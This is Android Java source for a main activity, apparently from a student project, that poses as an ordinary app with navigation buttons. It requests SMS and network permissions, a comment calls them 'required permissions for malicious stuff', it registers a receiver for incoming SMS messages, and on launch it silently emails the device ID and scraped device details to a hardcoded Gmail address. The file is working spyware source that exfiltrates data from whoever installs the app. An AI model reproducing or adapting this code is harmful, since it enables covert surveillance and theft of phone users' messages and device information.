package com.example.a2207project;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity{
    final private int REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS = 124;

    private void checkMultiplePermissions(){
        if (Build.VERSION.SDK_INT >= 23)
        {
            List<String> permissionsNeeded = new ArrayList<String>();
            List<String> permissionsList = new ArrayList<String>();

            if(!addPermissions(permissionsList, android.Manifest.permission.ACCESS_NETWORK_STATE)){
                permissionsNeeded.add("Internet");
            }
            if(!addPermissions(permissionsList, Manifest.permission.RECEIVE_SMS))
            {
                permissionsNeeded.add("SMS");
            }
            if(permissionsList.size()>0)
            {
                requestPermissions(permissionsList.toArray(new String[permissionsList.size()]),
                        REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
                return;
            }
        }
    }
    private boolean addPermissions(List<String> permissionsList, String permission)
    {
        if (Build.VERSION.SDK_INT >= 23)
        {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)
            {
                permissionsList.add(permission);
                if (!shouldShowRequestPermissionRationale(permission))
                {
                    return false;
                }
            }
        }
        return true;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults)
    {
        switch (requestCode)
        {
            case REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS:{
                Map<String, Integer> perms = new HashMap<String, Integer>();
                perms.put(android.Manifest.permission.RECEIVE_SMS, PackageManager.PERMISSION_GRANTED);
                perms.put(Manifest.permission.INTERNET, PackageManager.PERMISSION_GRANTED);
                //Results
                for (int i =0; i<permissions.length; i++)
                {
                    perms.put(permissions[i], grantResults[i]);
                }
                if (perms.get(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
                && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED)
                {
                    //All required permissions for malicious stuff is granted
                    return;
                }
                else{
                    //Permissions are denied
                    if (Build.VERSION.SDK_INT >=23 )
                    {
                        Toast.makeText(
                                getApplicationContext(),
                                "My App cannot run without these permissions. Relaunch pls",
                                Toast.LENGTH_LONG).show();
                        finish();
                    }
                }
            }
            break;
            default:
            super.onRequestPermissionsResult(requestCode, permissions,grantResults);
        }
    }

    private void requestSMSPermissions()
    {
        String permission = Manifest.permission.RECEIVE_SMS;
        int grant = ContextCompat.checkSelfPermission(this,permission);
        if (grant != PackageManager.PERMISSION_GRANTED)
        {
            String[] permission_list = new String[1];
            permission_list[0] = permission;
            ActivityCompat.requestPermissions(this,permission_list,1);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //requestSMSPermissions();
        if (Build.VERSION.SDK_INT >=23)
        {
            checkMultiplePermissions();
        }

        //Represents the intent that is broadcast when new SMS is received
        //Receive the broadcast when new SMS arrives and parses it in SMSBroadcastReceiver class
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        SMSBroadcastReceiver smsBroadcastReceiver = new SMSBroadcastReceiver();
        registerReceiver(smsBroadcastReceiver, intentFilter);
        
        String deviceID =Settings.Secure.getString(this.getContentResolver(),Settings.Secure.ANDROID_ID);
        EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ deviceID, DeviceScrape.getDeviceInfo() );


        Button button=findViewById(R.id.secondActivityButton);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this,SecondActivity.class);
                startActivity(intent);
            }
        });
        Button button1 = findViewById(R.id.secondActivityButton2);
        button1.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View view)
            {
                Intent intent = new Intent(MainActivity.this,ThirdActivity.class);
                startActivity(intent);
            }
        });
        Button button2 = findViewById(R.id.secondActivityButton3);
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this,FourthActivity.class);
                startActivity(intent);
            }
        });
        Button button3 = findViewById(R.id.secondActivityButton4);
        button3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this,FifthActivity.class);
                startActivity(intent);
            }
        });
        Button button4 = findViewById(R.id.secondActivityButton5);
        button4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this,SixthActivity.class);
                startActivity(intent);
            }
        });
        Button button5 = findViewById(R.id.secondActivityButton6);
        button5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this,SeventhActivity.class);
                startActivity(intent);
            }
        });



    }
}